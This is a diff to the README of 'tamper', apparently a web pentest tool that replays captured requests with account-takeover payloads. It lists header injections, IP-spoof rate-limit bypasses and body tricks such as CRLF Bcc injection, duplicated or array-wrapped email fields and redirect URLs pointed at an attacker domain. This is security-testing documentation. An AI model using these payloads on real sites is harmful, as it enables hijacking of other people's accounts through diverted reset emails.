@@ -67,10 +67,11 @@ tamper -r <request file> [flags]
 | flag | default | description |
 |---|---|---|
 | `-r` | required | path to raw request file (Burp / Caido format) |
-| `-d` | `evil.ktcipher.com` | attacker domain for header injection payloads |
-| `--mode` | all | `1` = header only · `2` = body only · `3` = both |
+| `-d` | `evil.ktcipher.com` | attacker domain for header injection and email construction |
+| `-e` | — | attacker email for body payloads — required for `--mode 2` / `3` |
+| `--mode` | `3` | `1` = header only · `2` = body only · `3` = both |
 | `--dry` | false | preview all payloads without sending |
-| `-v` | false | verbose — print full request before sending |
+| `-v` | false | verbose — print full request before sending and full response after |
 
 ---
 
@@ -111,7 +112,7 @@ tamper -r request.txt --mode 1 -d your.burpcollaborator.net
 **4. Run everything verbosely:**
 
 ```bash
-tamper -r request.txt -v
+tamper -r request.txt -e evil@attacker.com -v
 ```
 
 ---
@@ -124,16 +125,22 @@ tamper -r request.txt -v
   Domain : evil.ktcipher.com
  ──────────────────────────────────────────────────────────
 
-  [4/31] Duplicate keys (body)
+  [4/35] Duplicate keys (body)
   repeat each field key with attacker value second
+
+  Payload preview:
+  ~ email: victim@gmail.com  →  victim@gmail.com, evil@evil.com
 
  [*] Press Enter to send, q to quit:
 
- Response : 200
- Body     : {"success":true}
+  Response      : 200  (43 ms)
+  Content-Type  : application/json
+  Content-Length: 33
+  Location      : (none)
 
- Result (y/n/q with optional notes after dot): n. link unchanged
- [*] Logged: no-impact - link unchanged
+  ▶  Mark result:  [y] interesting   [n] no impact   [q] quit
+     Notes (Enter to skip): link unchanged
+  [*] Logged: no-impact
 ```
 
 Each payload clears the screen and re-renders the banner so you always know where you are. Between send and result logging you have time to check your inbox, Collaborator, or any out-of-band channel.
@@ -163,25 +170,31 @@ Each payload clears the screen and re-renders the banner so you always know wher
 | 15 | Client-IP spoof | IP spoof for rate limit bypass |
 | 16 | True-Client-IP spoof | IP spoof for rate limit bypass |
 
-### body manipulation (15)
+### body manipulation (19)
 
 | # | name | what it does |
 |---|---|---|
-| 1 | Array injection | `"field": ["original", "evil@attacker.com"]` |
-| 2 | Mixed array | first field array, rest stay string |
-| 3 | Null confusion | all fields set to `null` |
-| 4 | Int confusion | all fields set to `0` |
-| 5 | Bool confusion | all fields set to `true` |
-| 6 | Duplicate keys | `{"email":"victim","email":"attacker"}` |
-| 7 | HTML injection | `<b>value</b>` — tests unsanitized email rendering |
-| 8 | Extra fields | appends `redirectUrl`, `callbackUrl`, `next`, etc |
-| 9 | Nested object | `{"field": {"value": "orig", "email": "evil"}}` |
-| 10 | Comma separated | `"victim@x.com,evil@attacker.com"` |
-| 11 | Pipe separated | `"victim@x.com\|evil@attacker.com"` |
-| 12 | CRLF injection | `value%0aBcc:evil@attacker.com` |
-| 13 | backup_email field | adds `backup_email` key with attacker value |
-| 14 | Nested user.email | adds `"user": {"email": "evil@attacker.com"}` |
-| 15 | Parameter pollution | duplicate params for form-encoded bodies |
+| 1 | Array injection | wraps all email fields as `["original", "evil@attacker.com"]` |
+| 2 | Null confusion | all fields set to `null` |
+| 3 | Int confusion | all fields set to `0` |
+| 4 | Bool confusion | all fields set to `true` |
+| 5 | Duplicate keys | `{"email":"victim","email":"attacker"}` |
+| 6 | HTML injection | `<b>value</b>` — tests unsanitized email rendering |
+| 7 | redirectUrl field | replaces existing `redirectUrl` with attacker domain |
+| 8 | callbackUrl field | replaces existing `callbackUrl` with attacker domain |
+| 9 | next field | replaces existing `next` with attacker domain |
+| 10 | returnUrl field | replaces existing `returnUrl` with attacker domain |
+| 11 | callback field | replaces existing `callback` with attacker domain |
+| 12 | redirect field | replaces existing `redirect` with attacker domain |
+| 13 | Nested object | `{"field": {"value": "orig", "email": "evil"}}` |
+| 14 | Comma separated | `"victim@x.com,evil@attacker.com"` |
+| 15 | Pipe separated | `"victim@x.com\|evil@attacker.com"` |
+| 16 | CRLF injection | `value%0aBcc:evil@attacker.com` |
+| 17 | backup_email field | adds `backup_email` key with attacker value |
+| 18 | Nested user.email | adds `"user": {"email": "evil@attacker.com"}` |
+| 19 | Parameter pollution | form-encoded only — `email=a&email=evil` duplicate params |
+
+The redirect/url payloads (7–12) are presence-gated: each one only runs when that exact field already exists in the request — they never inject new keys. Because they're gated, the total queued payload count varies per request. Same for Parameter pollution (19), which only appears on `application/x-www-form-urlencoded` requests.
 
 ---
 
@@ -215,7 +228,7 @@ With a summary at the end:
 
 ```markdown
 ## Summary
-- Total: 31
+- Total: 35
 - Interesting: 2
 - No impact: 29
 ```
